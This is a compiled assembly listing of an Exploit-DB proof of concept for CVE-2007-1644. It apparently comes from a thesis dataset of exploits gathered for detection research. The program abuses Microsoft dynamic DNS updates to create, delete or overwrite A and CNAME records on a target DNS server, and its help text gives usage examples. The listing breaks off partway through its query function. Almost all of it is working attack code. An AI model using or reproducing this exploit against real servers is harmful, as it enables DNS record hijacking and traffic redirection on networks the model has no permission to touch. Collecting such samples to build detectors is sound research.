; Listing generated by Microsoft (R) Optimizing Compiler Version 19.28.29913.0 

	TITLE	C:\Users\matti\Desktop\Magistrale\tesi\poc_detection\temp_dir\dataset_expansion_programs\manella\foobar\all_exploits\os_based\exp_db_3544_cve_id_CVE-2007-1644.obj
	.686P
	.XMM
	include listing.inc
	.model	flat

INCLUDELIB LIBCMT
INCLUDELIB OLDNAMES

PUBLIC	_TargetDnsServer
PUBLIC	_TargetDnsRecord
PUBLIC	_NewIpAddress
PUBLIC	_DeleteDnsRecord
PUBLIC	_CreateDnsRecord
PUBLIC	_CreationType
_BSS	SEGMENT
_TargetDnsServer DB 0100H DUP (?)
_TargetDnsRecord DB 0100H DUP (?)
_NewIpAddress DB 0100H DUP (?)
_DeleteDnsRecord DB 0100H DUP (?)
_CreateDnsRecord DB 0100H DUP (?)
_BSS	ENDS
_DATA	SEGMENT
_CreationType DW 01H
_DATA	ENDS
PUBLIC	___local_stdio_printf_options
PUBLIC	__vfprintf_l
PUBLIC	_printf
PUBLIC	_usage
PUBLIC	_DnsQueryA
PUBLIC	_main
EXTRN	___acrt_iob_func:PROC
EXTRN	_fflush:PROC
EXTRN	_getchar:PROC
EXTRN	___stdio_common_vfprintf:PROC
EXTRN	_memset:PROC
EXTRN	_strcpy:PROC
EXTRN	__imp__GetLastError@0:PROC
EXTRN	_malloc:PROC
EXTRN	_exit:PROC
EXTRN	__imp__inet_addr@4:PROC
EXTRN	__imp__inet_ntoa@4:PROC
EXTRN	_DnsFree@8:PROC
EXTRN	_DnsQuery_A@24:PROC
EXTRN	_DnsAcquireContextHandle_A@12:PROC
EXTRN	_DnsModifyRecordsInSet_A@24:PROC
EXTRN	_DnsReplaceRecordSetA@20:PROC
_DATA	SEGMENT
COMM	?_OptionsStorage@?1??__local_stdio_printf_options@@9@9:QWORD							; `__local_stdio_printf_options'::`2'::_OptionsStorage
_DATA	ENDS
_DATA	SEGMENT
	ORG $+2
$SG100649 DB	'[+] Host %s resolved as %s', 0aH, 00H
$SG100651 DB	'[+] Domain %s Dns Servers: %s', 0aH, 00H
	ORG $+1
$SG100653 DB	'[+] Host %s resolved as CNAME %s', 0aH, 00H
	ORG $+2
$SG100655 DB	'[+] SOA Information: PrimaryServer: %s', 0aH, 00H
$SG100656 DB	'[+] SOA Information: Administrator: %s', 0aH, 00H
	ORG $+4
$SG100657 DB	'[+] SOA Information: SerialNo %x - Refresh %i - retry %i'
	DB	' - Expire %i - DefaultTld %i', 0aH, 00H
	ORG $+2
$SG100659 DB	'[+] %s MX Server resolved as %s (Preference %i)', 0aH, 00H
	ORG $+3
$SG100661 DB	'[+] Text: %i bytes', 0aH, 00H
$SG100663 DB	'[+] SRV Record. NameTarget %s ', 00H
	ORG $+1
$SG100664 DB	'(Priority %i - Port %i - Weigth: %i)', 0aH, 00H
	ORG $+2
$SG100666 DB	'[-] DnsQuery returned unknown wtype %x', 0aH, 00H
$SG100669 DB	'[-] Record not found', 0aH, 00H
	ORG $+2
$SG100670 DB	'[-] Query Error: %i - %i', 0aH, 00H
	ORG $+2
$SG100713 DB	' Microsoft Dynamic DNS Updates - Proof of Concept', 0aH, 00H
	ORG $+1
$SG100714 DB	' http://www.514.es - (c) 2007 Andres Tarasco Acu', 0f1H, 'a'
	DB	0aH, 0aH, 00H
	ORG $+3
$SG100729 DB	'127.0.0.1', 00H
	ORG $+2
$SG100734 DB	'[-] Invalid argument: %s', 0aH, 00H
	ORG $+2
$SG100735 DB	'[+] Gathering Credentials..', 0aH, 00H
	ORG $+3
$SG100744 DB	'[+] Creating DNS CName Record for %s (%s)', 0aH, 00H
	ORG $+1
$SG100745 DB	'[+] Creating DNS A Record for %s (%s)', 0aH, 00H
	ORG $+1
$SG100748 DB	'[+] Host Created. Rechecking Record...', 0aH, 00H
$SG100749 DB	'[-] Error: Unable to create  %s (%i)', 0aH, 00H
	ORG $+2
$SG100752 DB	'[+] Trying to resolve Host: %s before deleting', 0aH, 00H
$SG100755 DB	'[+] Trying to Delete Record. Are You Sure? (Y/N)...', 00H
$SG100757 DB	'[+] Deleting record %s', 0aH, 00H
$SG100760 DB	'[+] Host Deleted. Rechecking Record %s...', 0aH, 00H
	ORG $+1
$SG100761 DB	'[-] Error: Unable to Delete %s', 0aH, 00H
$SG100762 DB	'[-] Host %s not found', 0aH, 00H
	ORG $+1
$SG100765 DB	'[+] Trying to resolve Host: %s before updating', 0aH, 00H
$SG100768 DB	'[+] Trying to update record. Are You Sure? (Y/N)...', 00H
$SG100770 DB	'[+] Trying to set ip address of the host %s to %s ', 0aH
	DB	00H
$SG100771 DB	'[+] Trying to Modify Record...', 0aH, 00H
$SG100774 DB	'[+] Host Updated. Rechecking Record...', 0aH, 00H
$SG100775 DB	'[-] Error: Unable to Delete %s', 0aH, 00H
$SG100776 DB	'[-] Unable to Update Record (Type %x)', 0aH, 00H
	ORG $+1
$SG100779 DB	'[+] Query Information for host %s...', 0aH, 00H
	ORG $+2
$SG100780 DB	'[-] Unknown Options', 0aH, 00H
	ORG $+3
$SG100781 DB	'[-] Error Calling DnsAcquireContextHandle', 0aH, 00H
	ORG $+1
$SG100785 DB	' Usage:', 0aH, 00H
	ORG $+3
$SG100786 DB	09H, '%s', 09H, ' -[s]d|c|q[u] <options>', 0aH, 00H
	ORG $+3
$SG100787 DB	' Details:', 0aH, 00H
	ORG $+1
$SG100788 DB	09H, '%s', 09H, ' -s  ip        (dns Server (optional))', 0aH
	DB	00H
$SG100789 DB	09H, '%s', 09H, ' -d  fqdn      (Delete dns record)', 0aH
	DB	00H
$SG100790 DB	09H, '%s', 09H, ' -q  fqdn      (Query  dns record)', 0aH
	DB	00H
$SG100791 DB	09H, '%s', 09H, ' -c[a|c] ip    (Create A or CName record'
	DB	' (default A))', 0aH, 00H
	ORG $+1
$SG100792 DB	09H, '%s', 09H, ' -u  ip|fqdn   (Update dns record (requi'
	DB	'res -q or -c))', 0aH, 00H
$SG100793 DB	0aH, ' Examples:', 0aH, 00H
	ORG $+7
$SG100794 DB	09H, '%s -s 10.0.0.1 -q proxy.mydomain.com -u 5.1.4.77 (U'
	DB	'pdates record)', 0aH, 00H
	ORG $+4
$SG100795 DB	09H, '%s -s 10.0.0.1 -d foo.mydomain.com      (delete foo'
	DB	'.mydomain.com record)', 0aH, 00H
	ORG $+5
$SG100796 DB	09H, '%s -s 10.0.0.1 -c atarasco.foo.mydomain.com -u 5.14'
	DB	'.7.7 (creates record)', 0aH, 00H
	ORG $+5
$SG100797 DB	09H, '%s -s 10.0.0.1 -cc www.atarasco.foo.mydomain.com -u'
	DB	' 5.14.7.7 (creates record)', 0aH, 00H
$SG100798 DB	09H, '%s -s 10.0.0.1 -q _ldap._tcp.mydomain             ('
	DB	'Query for srv record)', 0aH, 00H
_DATA	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
_ipaddr$ = -44						; size = 4
_pReserved$ = -40					; size = 4
tv186 = -36						; size = 4
_Options$ = -32						; size = 4
_ContextHandle$ = -28					; size = 4
tv93 = -24						; size = 4
_Credentials$ = -20					; size = 4
_status$ = -16						; size = 4
_servers$ = -12						; size = 4
_result$ = -8						; size = 4
_i$ = -4						; size = 2
_argc$ = 8						; size = 4
_argv$ = 12						; size = 4
_main	PROC
; File C:\Users\matti\Desktop\Magistrale\tesi\poc_detection\temp_dir\dataset_expansion_programs\manella\foobar\all_exploits\os_based\exp_db_3544_cve_id_CVE-2007-1644.c
; Line 169
	push	ebp
	mov	ebp, esp
	sub	esp, 44					; 0000002cH
; Line 176
	mov	DWORD PTR _Options$[ebp], 32		; 00000020H
; Line 177
	mov	DWORD PTR _pReserved$[ebp], 0
; Line 179
	mov	DWORD PTR _servers$[ebp], 0
; Line 180
	mov	DWORD PTR _Credentials$[ebp], 0
; Line 183
	push	OFFSET $SG100713
	call	_printf
	add	esp, 4
; Line 184
	push	OFFSET $SG100714
	call	_printf
	add	esp, 4
; Line 185
	cmp	DWORD PTR _argc$[ebp], 1
	jne	SHORT $LN9@main
	mov	eax, DWORD PTR _argv$[ebp]
	push	eax
	call	_usage
	add	esp, 4
$LN9@main:
; Line 188
	push	28					; 0000001cH
	call	_malloc
	add	esp, 4
	mov	DWORD PTR _Credentials$[ebp], eax
; Line 189
	push	28					; 0000001cH
	push	0
	mov	ecx, DWORD PTR _Credentials$[ebp]
	push	ecx
	call	_memset
	add	esp, 12					; 0000000cH
; Line 190
	mov	edx, DWORD PTR _Credentials$[ebp]
	mov	DWORD PTR [edx+24], 1
; Line 191
	mov	eax, 1
	mov	WORD PTR _i$[ebp], ax
	jmp	SHORT $LN4@main
$LN2@main:
	mov	cx, WORD PTR _i$[ebp]
	add	cx, 1
	mov	WORD PTR _i$[ebp], cx
$LN4@main:
	movzx	edx, WORD PTR _i$[ebp]
	cmp	edx, DWORD PTR _argc$[ebp]
	jge	$LN3@main
; Line 192
	movzx	eax, WORD PTR _i$[ebp]
	mov	ecx, 1
	imul	edx, ecx, 0
	mov	ecx, DWORD PTR _argv$[ebp]
	mov	eax, DWORD PTR [ecx+eax*4]
	movsx	ecx, BYTE PTR [eax+edx]
	cmp	ecx, 45					; 0000002dH
	jne	$LN10@main
; Line 193
	movzx	edx, WORD PTR _i$[ebp]
	mov	eax, 1
	shl	eax, 0
	mov	ecx, DWORD PTR _argv$[ebp]
	mov	edx, DWORD PTR [ecx+edx*4]
	movsx	eax, BYTE PTR [edx+eax]
	mov	DWORD PTR tv93[ebp], eax
	mov	ecx, DWORD PTR tv93[ebp]
	sub	ecx, 67					; 00000043H
	mov	DWORD PTR tv93[ebp], ecx
	cmp	DWORD PTR tv93[ebp], 50			; 00000032H
	ja	$LN26@main
	mov	edx, DWORD PTR tv93[ebp]
	movzx	eax, BYTE PTR $LN54@main[edx]
	jmp	DWORD PTR $LN55@main[eax*4]
$LN13@main:
; Line 196
	movzx	ecx, WORD PTR _i$[ebp]
	mov	edx, DWORD PTR _argv$[ebp]
	mov	eax, DWORD PTR [edx+ecx*4+4]
	push	eax
	push	OFFSET _TargetDnsServer
	call	_strcpy
	add	esp, 8
; Line 197
	push	8
	call	_malloc
	add	esp, 4
	mov	DWORD PTR _servers$[ebp], eax
; Line 198
	mov	ecx, DWORD PTR _servers$[ebp]
	mov	DWORD PTR [ecx], 1
; Line 199
	push	OFFSET _TargetDnsServer
	call	DWORD PTR __imp__inet_addr@4
	mov	edx, 4
	imul	ecx, edx, 0
	mov	edx, DWORD PTR _servers$[ebp]
	mov	DWORD PTR [edx+ecx+4], eax
; Line 200
	jmp	$LN5@main
$LN15@main:
; Line 203
	movzx	eax, WORD PTR _i$[ebp]
	mov	ecx, DWORD PTR _argv$[ebp]
	mov	edx, DWORD PTR [ecx+eax*4+4]
	push	edx
	push	OFFSET _DeleteDnsRecord
	call	_strcpy
	add	esp, 8
; Line 204
	jmp	$LN5@main
$LN17@main:
; Line 207
	movzx	eax, WORD PTR _i$[ebp]
	mov	ecx, DWORD PTR _argv$[ebp]
	mov	edx, DWORD PTR [ecx+eax*4+4]
	push	edx
	push	OFFSET _TargetDnsRecord
	call	_strcpy
	add	esp, 8
; Line 208
	jmp	$LN5@main
$LN19@main:
; Line 211
	movzx	eax, WORD PTR _i$[ebp]
	mov	ecx, DWORD PTR _argv$[ebp]
	mov	edx, DWORD PTR [ecx+eax*4+4]
	push	edx
	push	OFFSET _NewIpAddress
	call	_strcpy
	add	esp, 8
; Line 212
	jmp	$LN5@main
$LN21@main:
; Line 215
	movzx	eax, WORD PTR _i$[ebp]
	mov	ecx, DWORD PTR _argv$[ebp]
	mov	edx, DWORD PTR [ecx+eax*4+4]
	push	edx
	push	OFFSET _CreateDnsRecord
	call	_strcpy
	add	esp, 8
; Line 216
	mov	eax, 1
	imul	ecx, eax, 0
	movsx	edx, BYTE PTR _NewIpAddress[ecx]
	test	edx, edx
	jne	SHORT $LN22@main
	push	OFFSET $SG100729
	push	OFFSET _NewIpAddress
	call	_strcpy
	add	esp, 8
$LN22@main:
; Line 217
	movzx	eax, WORD PTR _i$[ebp]
	mov	ecx, 1
	shl	ecx, 1
	mov	edx, DWORD PTR _argv$[ebp]
	mov	eax, DWORD PTR [edx+eax*4]
	movsx	ecx, BYTE PTR [eax+ecx]
	test	ecx, ecx
	je	SHORT $LN23@main
; Line 218
	movzx	edx, WORD PTR _i$[ebp]
	mov	eax, 1
	shl	eax, 1
	mov	ecx, DWORD PTR _argv$[ebp]
	mov	edx, DWORD PTR [ecx+edx*4]
	mov	al, BYTE PTR [eax+edx]
	mov	BYTE PTR tv186[ebp], al
	cmp	BYTE PTR tv186[ebp], 97			; 00000061H
	je	SHORT $LN25@main
	cmp	BYTE PTR tv186[ebp], 99			; 00000063H
	je	SHORT $LN24@main
	jmp	SHORT $LN23@main
$LN24@main:
; Line 219
	mov	ecx, 5
	mov	WORD PTR _CreationType, cx
; Line 220
	jmp	SHORT $LN23@main
$LN25@main:
; Line 221
	mov	edx, 1
	mov	WORD PTR _CreationType, dx
$LN23@main:
; Line 225
	jmp	SHORT $LN5@main
$LN26@main:
; Line 238
	movzx	eax, WORD PTR _i$[ebp]
	mov	ecx, DWORD PTR _argv$[ebp]
	mov	edx, DWORD PTR [ecx+eax*4]
	push	edx
	push	OFFSET $SG100734
	call	_printf
	add	esp, 8
; Line 239
	mov	eax, DWORD PTR _argv$[ebp]
	push	eax
	call	_usage
	add	esp, 4
$LN5@main:
; Line 242
	mov	cx, WORD PTR _i$[ebp]
	add	cx, 1
	mov	WORD PTR _i$[ebp], cx
	jmp	SHORT $LN11@main
$LN10@main:
; Line 243
	mov	edx, DWORD PTR _argv$[ebp]
	push	edx
	call	_usage
	add	esp, 4
$LN11@main:
; Line 244
	jmp	$LN2@main
$LN3@main:
; Line 246
	push	OFFSET $SG100735
	call	_printf
	add	esp, 4
; Line 248
	mov	eax, DWORD PTR _Credentials$[ebp]
	cmp	DWORD PTR [eax+4], 0
	jne	SHORT $LN27@main
; Line 249
	lea	ecx, DWORD PTR _ContextHandle$[ebp]
	push	ecx
	push	0
	push	0
	call	_DnsAcquireContextHandle_A@12
	mov	DWORD PTR _status$[ebp], eax
; Line 250
	jmp	SHORT $LN28@main
$LN27@main:
; Line 251
	lea	edx, DWORD PTR _ContextHandle$[ebp]
	push	edx
	mov	eax, DWORD PTR _Credentials$[ebp]
	push	eax
	push	0
	call	_DnsAcquireContextHandle_A@12
	mov	DWORD PTR _status$[ebp], eax
$LN28@main:
; Line 254
	cmp	DWORD PTR _status$[ebp], 0
	jne	$LN29@main
; Line 255
	mov	ecx, 1
	imul	edx, ecx, 0
	movsx	eax, BYTE PTR _CreateDnsRecord[edx]
	test	eax, eax
	je	$LN31@main
	mov	ecx, 1
	imul	edx, ecx, 0
	movsx	eax, BYTE PTR _NewIpAddress[edx]
	test	eax, eax
	je	$LN31@main
; Line 257
	push	64					; 00000040H
	call	_malloc
	add	esp, 4
	mov	DWORD PTR _result$[ebp], eax
; Line 258
	push	64					; 00000040H
	push	0
	mov	ecx, DWORD PTR _result$[ebp]
	push	ecx
	call	_memset
	add	esp, 12					; 0000000cH
; Line 259
	mov	edx, DWORD PTR _result$[ebp]
	mov	ax, WORD PTR _CreationType
	mov	WORD PTR [edx+8], ax
; Line 260
	movzx	ecx, WORD PTR _CreationType
	cmp	ecx, 5
	jne	SHORT $LN33@main
; Line 261
	push	OFFSET _NewIpAddress
	push	OFFSET _CreateDnsRecord
	push	OFFSET $SG100744
	call	_printf
	add	esp, 12					; 0000000cH
; Line 262
	mov	edx, DWORD PTR _result$[ebp]
	mov	DWORD PTR [edx+24], OFFSET _NewIpAddress
; Line 263
	jmp	SHORT $LN34@main
$LN33@main:
; Line 264
	push	OFFSET _NewIpAddress
	push	OFFSET _CreateDnsRecord
	push	OFFSET $SG100745
	call	_printf
	add	esp, 12					; 0000000cH
; Line 265
	push	OFFSET _NewIpAddress
	call	DWORD PTR __imp__inet_addr@4
	mov	ecx, DWORD PTR _result$[ebp]
	mov	DWORD PTR [ecx+24], eax
$LN34@main:
; Line 267
	mov	edx, DWORD PTR _result$[ebp]
	mov	DWORD PTR [edx+4], OFFSET _CreateDnsRecord
; Line 268
	mov	eax, 4
	mov	ecx, DWORD PTR _result$[ebp]
	mov	WORD PTR [ecx+10], ax
; Line 269
	mov	edx, DWORD PTR _result$[ebp]
	mov	eax, DWORD PTR [edx+12]
	and	eax, -4					; fffffffcH
	or	eax, 1
	mov	ecx, DWORD PTR _result$[ebp]
	mov	DWORD PTR [ecx+12], eax
; Line 270
	mov	edx, DWORD PTR _result$[ebp]
	mov	eax, DWORD PTR [edx+12]
	or	eax, 24					; 00000018H
	mov	ecx, DWORD PTR _result$[ebp]
	mov	DWORD PTR [ecx+12], eax
; Line 271
	mov	edx, DWORD PTR _result$[ebp]
	mov	DWORD PTR [edx], 0
; Line 273
	push	0
	mov	eax, DWORD PTR _servers$[ebp]
	push	eax
	mov	ecx, DWORD PTR _ContextHandle$[ebp]
	push	ecx
	mov	edx, DWORD PTR _Options$[ebp]
	push	edx
	push	0
	mov	eax, DWORD PTR _result$[ebp]
	push	eax
	call	_DnsModifyRecordsInSet_A@24
	mov	DWORD PTR _status$[ebp], eax
; Line 279
	cmp	DWORD PTR _status$[ebp], 0
	jne	SHORT $LN35@main
; Line 280
	push	OFFSET $SG100748
	call	_printf
	add	esp, 4
; Line 281
	push	1
	mov	ecx, DWORD PTR _result$[ebp]
	push	ecx
	call	_DnsFree@8
; Line 282
	mov	edx, DWORD PTR _servers$[ebp]
	push	edx
	push	OFFSET _CreateDnsRecord
	call	_DnsQueryA
	add	esp, 8
	mov	DWORD PTR _result$[ebp], eax
; Line 283
	jmp	SHORT $LN36@main
$LN35@main:
; Line 284
	mov	eax, DWORD PTR _status$[ebp]
	push	eax
	push	OFFSET _CreateDnsRecord
	push	OFFSET $SG100749
	call	_printf
	add	esp, 12					; 0000000cH
$LN36@main:
; Line 285
	jmp	$LN32@main
$LN31@main:
; Line 286
	mov	ecx, 1
	imul	edx, ecx, 0
	movsx	eax, BYTE PTR _DeleteDnsRecord[edx]
	test	eax, eax
	je	$LN37@main
; Line 287
	push	OFFSET _DeleteDnsRecord
	push	OFFSET $SG100752
	call	_printf
	add	esp, 8
; Line 288
	mov	ecx, DWORD PTR _servers$[ebp]
	push	ecx
	push	OFFSET _DeleteDnsRecord
	call	_DnsQueryA
	add	esp, 8
	mov	DWORD PTR _result$[ebp], eax
; Line 289
	cmp	DWORD PTR _result$[ebp], 0
	je	$LN39@main
; Line 290
	push	OFFSET $SG100755
	call	_printf
	add	esp, 4
; Line 291
	call	_getchar
	mov	WORD PTR _i$[ebp], ax
	movzx	edx, WORD PTR _i$[ebp]
	cmp	edx, 121				; 00000079H
	je	SHORT $LN41@main
	or	eax, -1
	jmp	$LN1@main
$LN41@main:
; Line 292
	push	OFFSET _DeleteDnsRecord
	push	OFFSET $SG100757
	call	_printf
	add	esp, 8
; Line 293
	push	0
	mov	eax, DWORD PTR _servers$[ebp]
	push	eax
	mov	ecx, DWORD PTR _ContextHandle$[ebp]
	push	ecx
	mov	edx, DWORD PTR _Options$[ebp]
	push	edx
	mov	eax, DWORD PTR _result$[ebp]
	push	eax
	push	0
	call	_DnsModifyRecordsInSet_A@24
	mov	DWORD PTR _status$[ebp], eax
; Line 299
	cmp	DWORD PTR _status$[ebp], 0
	jne	SHORT $LN42@main
; Line 300
	push	OFFSET _DeleteDnsRecord
	push	OFFSET $SG100760
	call	_printf
	add	esp, 8
; Line 301
	push	1
	mov	ecx, DWORD PTR _result$[ebp]
	push	ecx
	call	_DnsFree@8
; Line 302
	mov	edx, DWORD PTR _servers$[ebp]
	push	edx
	push	OFFSET _DeleteDnsRecord
	call	_DnsQueryA
	add	esp, 8
	mov	DWORD PTR _result$[ebp], eax
; Line 303
	jmp	SHORT $LN43@main
$LN42@main:
; Line 304
	push	OFFSET _DeleteDnsRecord
	push	OFFSET $SG100761
	call	_printf
	add	esp, 8
$LN43@main:
; Line 306
	jmp	SHORT $LN40@main
$LN39@main:
; Line 307
	push	OFFSET _DeleteDnsRecord
	push	OFFSET $SG100762
	call	_printf
	add	esp, 8
$LN40@main:
; Line 308
	jmp	$LN32@main
$LN37@main:
; Line 310
	mov	eax, 1
	imul	ecx, eax, 0
	movsx	edx, BYTE PTR _TargetDnsRecord[ecx]
	test	edx, edx
	je	$LN44@main
	mov	eax, 1
	imul	ecx, eax, 0
	movsx	edx, BYTE PTR _NewIpAddress[ecx]
	test	edx, edx
	je	$LN44@main
; Line 312
	push	OFFSET _TargetDnsRecord
	push	OFFSET $SG100765
	call	_printf
	add	esp, 8
; Line 313
	mov	eax, DWORD PTR _servers$[ebp]
	push	eax
	push	OFFSET _TargetDnsRecord
	call	_DnsQueryA
	add	esp, 8
	mov	DWORD PTR _result$[ebp], eax
; Line 314
	mov	ecx, DWORD PTR _result$[ebp]
	movzx	edx, WORD PTR [ecx+8]
	cmp	edx, 1
	jne	$LN46@main
; Line 315
	push	OFFSET $SG100768
	call	_printf
	add	esp, 4
; Line 316
	call	_getchar
	mov	WORD PTR _i$[ebp], ax
	movzx	eax, WORD PTR _i$[ebp]
	cmp	eax, 121				; 00000079H
	je	SHORT $LN48@main
	or	eax, -1
	jmp	$LN1@main
$LN48@main:
; Line 317
	push	OFFSET _NewIpAddress
	call	DWORD PTR __imp__inet_addr@4
	mov	ecx, DWORD PTR _result$[ebp]
	mov	DWORD PTR [ecx+24], eax
; Line 318
	mov	edx, DWORD PTR _result$[ebp]
	mov	eax, DWORD PTR [edx+24]
	mov	DWORD PTR _ipaddr$[ebp], eax
; Line 319
	push	OFFSET _NewIpAddress
	push	OFFSET _TargetDnsRecord
	push	OFFSET $SG100770
	call	_printf
	add	esp, 12					; 0000000cH
; Line 320
	push	OFFSET $SG100771
	call	_printf
	add	esp, 4
; Line 321
	push	0
	mov	ecx, DWORD PTR _servers$[ebp]
	push	ecx
	mov	edx, DWORD PTR _ContextHandle$[ebp]
	push	edx
	mov	eax, DWORD PTR _Options$[ebp]
	push	eax
	mov	ecx, DWORD PTR _result$[ebp]
	push	ecx
	call	_DnsReplaceRecordSetA@20
	mov	DWORD PTR _status$[ebp], eax
; Line 326
	cmp	DWORD PTR _status$[ebp], 0
	jne	SHORT $LN49@main
; Line 327
	push	OFFSET $SG100774
	call	_printf
	add	esp, 4
; Line 328
	push	1
	mov	edx, DWORD PTR _result$[ebp]
	push	edx
	call	_DnsFree@8
; Line 329
	mov	eax, DWORD PTR _servers$[ebp]
	push	eax
	push	OFFSET _TargetDnsRecord
	call	_DnsQueryA
	add	esp, 8
	mov	DWORD PTR _result$[ebp], eax
; Line 330
	jmp	SHORT $LN50@main
$LN49@main:
; Line 331
	push	OFFSET _TargetDnsRecord
	push	OFFSET $SG100775
	call	_printf
	add	esp, 8
$LN50@main:
; Line 334
	jmp	SHORT $LN47@main
$LN46@main:
; Line 335
	mov	ecx, DWORD PTR _result$[ebp]
	movzx	edx, WORD PTR [ecx+8]
	push	edx
	push	OFFSET $SG100776
	call	_printf
	add	esp, 8
$LN47@main:
; Line 336
	jmp	SHORT $LN32@main
$LN44@main:
; Line 337
	mov	eax, 1
	imul	ecx, eax, 0
	movsx	edx, BYTE PTR _TargetDnsRecord[ecx]
	test	edx, edx
	je	SHORT $LN51@main
; Line 338
	push	OFFSET _TargetDnsRecord
	push	OFFSET $SG100779
	call	_printf
	add	esp, 8
; Line 339
	mov	eax, DWORD PTR _servers$[ebp]
	push	eax
	push	OFFSET _TargetDnsRecord
	call	_DnsQueryA
	add	esp, 8
	mov	DWORD PTR _result$[ebp], eax
; Line 340
	push	1
	mov	ecx, DWORD PTR _result$[ebp]
	push	ecx
	call	_DnsFree@8
; Line 341
	jmp	SHORT $LN32@main
$LN51@main:
; Line 342
	push	OFFSET $SG100780
	call	_printf
	add	esp, 4
; Line 343
	or	eax, -1
	jmp	SHORT $LN1@main
$LN32@main:
; Line 345
	jmp	SHORT $LN30@main
$LN29@main:
; Line 346
	push	OFFSET $SG100781
	call	_printf
	add	esp, 4
$LN30@main:
; Line 348
	mov	eax, 1
$LN1@main:
; Line 349
	mov	esp, ebp
	pop	ebp
	ret	0
$LN55@main:
	DD	$LN21@main
	DD	$LN15@main
	DD	$LN17@main
	DD	$LN13@main
	DD	$LN19@main
	DD	$LN26@main
$LN54@main:
	DB	0
	DB	1
	DB	5
	DB	5
	DB	5
	DB	5
	DB	5
	DB	5
	DB	5
	DB	5
	DB	5
	DB	5
	DB	5
	DB	5
	DB	2
	DB	5
	DB	3
	DB	5
	DB	4
	DB	5
	DB	5
	DB	5
	DB	5
	DB	5
	DB	5
	DB	5
	DB	5
	DB	5
	DB	5
	DB	5
	DB	5
	DB	5
	DB	0
	DB	1
	DB	5
	DB	5
	DB	5
	DB	5
	DB	5
	DB	5
	DB	5
	DB	5
	DB	5
	DB	5
	DB	5
	DB	5
	DB	2
	DB	5
	DB	3
	DB	5
	DB	4
_main	ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
_count$ = -36						; size = 4
_ipaddr$ = -32						; size = 4
_fOptions$ = -28					; size = 4
_reserved$ = -24					; size = 4
_status$ = -20						; size = 4
_records$ = -16						; size = 4
tv86 = -12						; size = 4
_result$ = -8						; size = 4
_type$ = -4						; size = 2
_name$ = 8						; size = 4
_servers$ = 12						; size = 4
_DnsQueryA PROC
; File C:\Users\matti\Desktop\Magistrale\tesi\poc_detection\temp_dir\dataset_expansion_programs\manella\foobar\all_exploits\os_based\exp_db_3544_cve_id_CVE-2007-1644.c
; Line 77
	push	ebp
	mov	ebp, esp
	sub	esp, 36					; 00000024H
; Line 80
	mov	eax, 255				; 000000ffH
	mov	WORD PTR _type$[ebp], ax
; Line 81
	mov	DWORD PTR _fOptions$[ebp], 4328		; 000010e8H
; Line 82
	mov	DWORD PTR _reserved$[ebp], 0
; Line 83
	push	64					; 00000040H
	call	_malloc
	add	esp, 4
	mov	DWORD PTR _records$[ebp], eax
; Line 87
	mov	DWORD PTR _count$[ebp], 0
; Line 89
	cmp	DWORD PTR _name$[ebp], 0
	jne	SHORT $LN7@DnsQueryA
; Line 90
	xor	eax, eax
	jmp	$LN21@DnsQueryA
; Line 91
	jmp	$LN8@DnsQueryA
$LN7@DnsQueryA:
; Line 92
	push	64					; 00000040H
	push	0
	mov	ecx, DWORD PTR _records$[ebp]
	push	ecx
	call	_memset
	add	esp, 12					; 0000000cH
; Line 93
	mov	edx, DWORD PTR _reserved$[ebp]
	push	edx
	lea	eax, DWORD PTR _records$[ebp]
	push	eax
	mov	ecx, DWORD PTR _servers$[ebp]
	push	ecx
	mov	edx, DWORD PTR _fOptions$[ebp]
	push	edx
	movzx	eax, WORD PTR _type$[ebp]
	push	eax
	mov	ecx, DWORD PTR _name$[ebp]
	push	ecx
	call	_DnsQuery_A@24
	mov	DWORD PTR _status$[ebp], eax
; Line 100
	cmp	DWORD PTR _status$[ebp], 0
	jne	$LN9@DnsQueryA
; Line 102
	push	1
	call	___acrt_iob_func
	add	esp, 4
	push	eax
	call	_fflush
	add	esp, 4
; Line 103
	mov	edx, DWORD PTR _records$[ebp]
	mov	DWORD PTR _result$[ebp], edx
$LN4@DnsQueryA:
; Line 116
	mov	eax, DWORD PTR _result$[ebp]
	movzx	ecx, WORD PTR [eax+8]
	mov	DWORD PTR tv86[ebp], ecx
	mov	edx, DWORD PTR tv86[ebp]
	sub	edx, 1
	mov	DWORD PTR tv86[ebp], edx
	cmp	DWORD PTR tv86[ebp], 32			; 00000020H
	ja	$LN18@DnsQueryA
	mov	eax, DWORD PTR tv86[ebp]
	movzx	ecx, BYTE PTR $LN22@DnsQueryA[eax]
	jmp	DWORD PTR $LN23@DnsQueryA[ecx*4]
$LN11@DnsQueryA:
; Line 118
	mov	edx, DWORD PTR _result$[ebp]
	mov	eax, DWORD PTR [edx+24]
	mov	DWORD PTR _ipaddr$[ebp], eax
; Line 119
	mov	ecx, DWORD PTR _ipaddr$[ebp]
	push	ecx
	call	DWORD PTR __imp__inet_ntoa@4
	push	eax
	mov	edx, DWORD PTR _result$[ebp]
	mov	eax, DWORD PTR [edx+4]
	push	eax
	push	OFFSET $SG100649
	call	_printf
	add	esp, 12					; 0000000cH
; Line 120
	jmp	$LN5@DnsQueryA
$LN12@DnsQueryA:
; Line 122
	mov	ecx, DWORD PTR _result$[ebp]
	mov	edx, DWORD PTR [ecx+24]
	push	edx
	mov	eax, DWORD PTR _result$[ebp]
	mov	ecx, DWORD PTR [eax+4]
	push	ecx
	push	OFFSET $SG100651
	call	_printf
	add	esp, 12					; 0000000cH
; Line 123
	jmp	$LN5@DnsQueryA
$LN13@DnsQueryA:
; Line 125
	mov	edx, DWORD PTR _result$[ebp]
	mov	eax, DWORD PTR [edx+24]
	push	eax
	mov	ecx, DWORD PTR _result$[ebp]
	mov	edx, DWORD PTR [ecx+4]
	push	edx
	push	OFFSET $SG100653
	call	_printf
	add	esp, 12					; 0000000cH
; Line 127
	jmp	$LN5@DnsQueryA
$LN14@DnsQueryA:
; Line 130
	mov	eax, DWORD PTR _result$[ebp]
	mov	ecx, DWORD PTR [eax+24]
	push	ecx
	push	OFFSET $SG100655
	call	_printf
	add	esp, 8
; Line 131
	mov	edx, DWORD PTR _result$[ebp]
	mov	eax, DWORD PTR [edx+28]
	push	eax
	push	OFFSET $SG100656
	call	_printf
	add	esp, 8
; Line 132
	mov	ecx, DWORD PTR _result$[ebp]
	mov	edx, DWORD PTR [ecx+48]
	push	edx
	mov	eax, DWORD PTR _result$[ebp]
	mov	ecx, DWORD PTR [eax+44]
	push	ecx
	mov	edx, DWORD PTR _result$[ebp]
	mov	eax, DWORD PTR [edx+40]
	push	eax
	mov	ecx, DWORD PTR _result$[ebp]
